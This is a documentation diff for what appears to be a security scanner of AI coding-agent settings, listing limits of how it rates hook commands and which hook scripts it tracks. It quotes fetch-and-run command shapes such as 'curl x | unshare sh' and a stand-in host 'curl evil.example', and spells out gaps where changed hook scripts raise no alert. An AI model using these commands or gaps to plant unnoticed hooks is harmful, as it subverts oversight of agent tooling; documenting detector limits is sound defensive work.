@@ -815,6 +815,22 @@ A way around a limit that its entry does not describe is worth a
   settings are bound by a digest of each settings file, not recorded. A changed
   value, such as an added hook command or a removed deny rule, raises a high
   `properties.settings_hashes changed` alert that names the agent, not the setting.
+- **Commands that run automatically are rated by shape.** Claude Code and Cursor hook
+  commands, the Claude Code `statusLine` command and the credential helpers are rated
+  by the forms the [finding catalog](finding-catalog.md) lists under `hook_commands`. A
+  download run through a wrapper, interpreter or file not listed there, such as
+  `curl x | unshare sh` or `curl x | deno run -`, or through a variable that holds the
+  command name, is medium, as is a downloader given a host without a scheme or a path,
+  such as `curl evil.example`. The Codex `notify` command and the Gemini CLI tool
+  discovery and call commands are digested but not rated. Settings `env` is rated by
+  the names `settings_environment` lists, never by value, so an endpoint set through
+  another variable, or a project tool that reads its own variable, is not reported.
+- **Hook scripts outside the hook directories are not read.** Every file under
+  `.claude/hooks` and `.cursor/hooks` is bound by digest as a skill resource, so a
+  change to one alerts. A hook that runs a script elsewhere in the project, such as
+  `scripts/fmt.sh`, binds only the program word in the settings digest, so changing
+  only that script raises no alert; nor does a change to a file a hook script itself
+  runs or sources. Keep hook scripts under those directories.
 - **Effective permissions are not resolved.** User and managed settings, workspace
   trust and session flags are not read, and deny and ask rules are counted, not
   applied to the allow list. A Claude Code allow rule whose command word is a shell,
